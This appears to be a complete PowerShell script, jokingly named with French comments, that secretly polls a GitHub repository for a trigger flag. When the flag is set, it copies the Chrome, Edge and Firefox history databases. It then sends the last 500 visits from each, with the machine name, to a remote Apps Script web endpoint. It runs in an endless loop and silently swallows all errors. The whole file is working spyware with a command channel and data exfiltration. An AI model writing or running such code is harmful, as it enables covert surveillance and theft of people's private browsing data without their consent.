# blague_historique_windows.ps1
# Surveille GitHub. Quand get_history=true -> lit l'historique Chrome/Firefox/Edge -> envoie au Apps Script.

$ConfigFile = Join-Path $PSScriptRoot "blague_config.json"
$config     = Get-Content $ConfigFile -Raw | ConvertFrom-Json

$headers = @{
    Authorization = "Bearer $($config.token)"
    Accept        = "application/vnd.github+json"
    "User-Agent"  = "PowerShell"
}

function Get-HistorySignal {
    try {
        $url  = "https://api.github.com/repos/$($config.owner)/$($config.repo)/contents/data/blague_historique.json?ref=$($config.branch)"
        $resp = Invoke-RestMethod -Uri $url -Headers $headers -ErrorAction Stop
        $json = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($resp.content -replace "\s","")))
        $data = $json | ConvertFrom-Json
        return @{ get_history = [bool]$data.get_history; sha = $resp.sha }
    } catch { return $null }
}

function Reset-HistorySignal($sha) {
    try {
        $body = @{
            message = "reset history signal"
            content = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{"get_history":false}'))
            sha     = $sha
            branch  = $config.branch
        } | ConvertTo-Json
        $url = "https://api.github.com/repos/$($config.owner)/$($config.repo)/contents/data/blague_historique.json"
        Invoke-RestMethod -Uri $url -Method Put -Headers $headers -Body $body -ContentType "application/json" | Out-Null
    } catch {}
}

function Get-ChromeHistory {
    $entries = @()
    $dbPath  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
    if (-not (Test-Path $dbPath)) { return $entries }

    # Copie temporaire car Chrome verrouille le fichier
    $tmp = Join-Path $env:TEMP "chrome_history_tmp"
    Copy-Item $dbPath $tmp -Force

    try {
        Add-Type -Path "$PSScriptRoot\System.Data.SQLite.dll" -ErrorAction SilentlyContinue
    } catch {}

    try {
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp;Version=3;Read Only=True;")
        $conn.Open()
        $cmd  = $conn.CreateCommand()
        $cmd.CommandText = "SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') as visited FROM urls ORDER BY last_visit_time DESC LIMIT 500"
        $reader = $cmd.ExecuteReader()
        while ($reader.Read()) {
            $entries += [PSCustomObject]@{
                navigateur = 'Chrome'
                url        = $reader['url']
                titre      = $reader['title']
                visite     = $reader['visited']
            }
        }
        $conn.Close()
    } catch {}

    Remove-Item $tmp -ErrorAction SilentlyContinue
    return $entries
}

function Get-EdgeHistory {
    $entries = @()
    $dbPath  = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
    if (-not (Test-Path $dbPath)) { return $entries }

    $tmp = Join-Path $env:TEMP "edge_history_tmp"
    Copy-Item $dbPath $tmp -Force

    try {
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp;Version=3;Read Only=True;")
        $conn.Open()
        $cmd  = $conn.CreateCommand()
        $cmd.CommandText = "SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') as visited FROM urls ORDER BY last_visit_time DESC LIMIT 500"
        $reader = $cmd.ExecuteReader()
        while ($reader.Read()) {
            $entries += [PSCustomObject]@{
                navigateur = 'Edge'
                url        = $reader['url']
                titre      = $reader['title']
                visite     = $reader['visited']
            }
        }
        $conn.Close()
    } catch {}

    Remove-Item $tmp -ErrorAction SilentlyContinue
    return $entries
}

function Get-FirefoxHistory {
    $entries = @()
    $profilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (-not (Test-Path $profilePath)) { return $entries }

    $dbPath = Get-ChildItem "$profilePath\*\places.sqlite" -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $dbPath) { return $entries }

    $tmp = Join-Path $env:TEMP "firefox_history_tmp"
    Copy-Item $dbPath.FullName $tmp -Force

    try {
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp;Version=3;Read Only=True;")
        $conn.Open()
        $cmd  = $conn.CreateCommand()
        $cmd.CommandText = "SELECT p.url, p.title, datetime(h.visit_date/1000000, 'unixepoch', 'localtime') as visited FROM moz_historyvisits h JOIN moz_places p ON h.place_id = p.id ORDER BY h.visit_date DESC LIMIT 500"
        $reader = $cmd.ExecuteReader()
        while ($reader.Read()) {
            $entries += [PSCustomObject]@{
                navigateur = 'Firefox'
                url        = $reader['url']
                titre      = $reader['title']
                visite     = $reader['visited']
            }
        }
        $conn.Close()
    } catch {}

    Remove-Item $tmp -ErrorAction SilentlyContinue
    return $entries
}

function Send-History {
    # Telecharger SQLite si absent
    $sqliteDll = Join-Path $PSScriptRoot "System.Data.SQLite.dll"
    if (-not (Test-Path $sqliteDll)) {
        try {
            $zipPath  = Join-Path $env:TEMP "sqlite.zip"
            $extractTo = Join-Path $env:TEMP "sqlite_ext"
            Invoke-WebRequest "https://system.data.sqlite.org/downloads/1.0.118.0/sqlite-netFx46-binary-x64-2015-1.0.118.0.zip" -OutFile $zipPath
            Expand-Archive $zipPath -DestinationPath $extractTo -Force
            $found = Get-ChildItem $extractTo -Filter "System.Data.SQLite.dll" -Recurse | Select-Object -First 1
            if ($found) { Copy-Item $found.FullName $sqliteDll -Force }
        } catch {}
    }

    $historique = @()
    $historique += Get-ChromeHistory
    $historique += Get-EdgeHistory
    $historique += Get-FirefoxHistory

    $body = @{
        type       = 'historique'
        machine    = $env:COMPUTERNAME
        date       = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
        historique = $historique
    } | ConvertTo-Json -Depth 5 -Compress

    try {
        Invoke-RestMethod -Uri $config.webapp_url -Method Post -Body $body -ContentType "application/json" | Out-Null
    } catch {}
}

# Boucle principale
while ($true) {
    $signal = Get-HistorySignal
    if ($signal -and $signal.get_history) {
        Reset-HistorySignal $signal.sha
        Send-History
    }
    Start-Sleep -Seconds 3
}
